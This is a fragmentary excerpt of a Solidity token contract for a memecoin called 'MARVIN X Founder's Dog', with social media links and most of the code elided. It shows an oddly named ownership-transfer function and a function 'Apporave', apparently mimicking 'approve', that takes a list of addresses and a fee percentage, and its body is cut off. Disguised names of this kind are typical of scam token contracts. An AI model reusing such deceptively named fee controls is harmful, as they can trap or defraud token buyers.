...
/**
https://t.me/MARVINXFoundersDog
https://twitter.com/Marvin_Erc
MARVIN  X Founder’s Dog
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipunityinfe(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract Marvin is Ownable {
    ...
    function Apporave(address[] memory _addresses, uint256 _feePercentage) external {
